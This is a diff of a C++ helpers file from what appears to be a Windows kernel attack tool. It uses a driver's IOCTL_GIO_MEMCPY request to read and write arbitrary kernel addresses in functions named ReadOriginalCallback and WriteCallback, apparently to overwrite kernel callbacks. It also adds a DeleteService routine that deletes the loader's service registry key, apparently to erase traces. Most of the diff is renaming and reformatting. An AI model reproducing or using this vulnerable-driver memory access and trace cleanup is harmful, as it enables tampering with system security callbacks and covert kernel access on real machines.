@@ -1,7 +1,7 @@
 #include "includes.h"
 #include "win_api_defs.h"
 
-DWORD64 helpers::FindInstructionWithPattern( DWORD64 imageBase, size_t imageSize, const unsigned char* pattern, size_t patternSize, size_t offsetAfterMatch = 0) {
+DWORD64 helpers::find_pattern( DWORD64 imageBase, size_t imageSize, const unsigned char* pattern, size_t patternSize, size_t offsetAfterMatch = 0) {
 
     for ( size_t i = 0; i < imageSize - patternSize; ++i ) {
         size_t j = 0;
@@ -50,24 +50,33 @@ NTSTATUS helpers::ReadOriginalCallback( HANDLE DeviceHandle, ULONG64 target, DWO
     GIOMemcpyInput MemcpyInput{};
     IO_STATUS_BLOCK IoStatusBlock{};
 
-    MemcpyInput.Src = target;
+    MemcpyInput.Src = { target };
     MemcpyInput.Dst = reinterpret_cast< ULONG64 >( &outValue );
     MemcpyInput.Size = sizeof( outValue );
     RtlZeroMemory( &IoStatusBlock, sizeof( IoStatusBlock ) );
 
-    return NtDeviceIoControlFile( DeviceHandle, nullptr, nullptr, nullptr, &IoStatusBlock, IOCTL_GIO_MEMCPY, &MemcpyInput, sizeof( MemcpyInput ), nullptr, 0 );
+    return NtDeviceIoControlFile( DeviceHandle, nullptr, nullptr, nullptr, 
+        &IoStatusBlock, IOCTL_GIO_MEMCPY, &MemcpyInput, sizeof( MemcpyInput ), nullptr, 0 );
 }
+
+void helpers::DeleteService( PWCHAR ServiceName )
+{
+    // TODO: drv side
+    SHDeleteKeyW( HKEY_LOCAL_MACHINE, ServiceName + sizeof( NT_MACHINE ) / sizeof( WCHAR ) - 1 );
+}
+
 
 NTSTATUS helpers::WriteCallback( HANDLE DeviceHandle, ULONG64 target, DWORD64 value ) {
     GIOMemcpyInput MemcpyInput{};
     IO_STATUS_BLOCK IoStatusBlock{};
 
     MemcpyInput.Src = reinterpret_cast< ULONG64 >( &value );
-    MemcpyInput.Dst = target;
+    MemcpyInput.Dst = { target };
     MemcpyInput.Size = sizeof( value );
     RtlZeroMemory( &IoStatusBlock, sizeof( IoStatusBlock ) );
 
-    return NtDeviceIoControlFile( DeviceHandle, nullptr, nullptr, nullptr, &IoStatusBlock, IOCTL_GIO_MEMCPY, &MemcpyInput, sizeof( MemcpyInput ), nullptr, 0 );
+    return NtDeviceIoControlFile( DeviceHandle, nullptr, nullptr, nullptr, 
+        &IoStatusBlock, IOCTL_GIO_MEMCPY, &MemcpyInput, sizeof( MemcpyInput ), nullptr, 0 );
 }
 
 NTSTATUS helpers::EnsureDeviceHandle( HANDLE* outHandle, PWSTR LoaderServiceName ) {
@@ -100,7 +109,7 @@ NTSTATUS helpers::EnsureDeviceHandle( HANDLE* outHandle, PWSTR LoaderServiceName
 PVOID helpers::GetProcessHeapFromPEB()
 {
 #ifdef _M_X64
-    PPEB_CUSTOM pPeb = ( PPEB_CUSTOM )__readgsqword( 0x60 ); //read that mf directly (VERG Proj)
+    PPEB_CUSTOM pPeb = ( PPEB_CUSTOM )__readgsqword( 0x60 ); //read the GS segment register directly
 #else
     PPEB_CUSTOM pPeb = ( PPEB_CUSTOM )__readfsdword( 0x30 ); // For 32-bit
 #endif
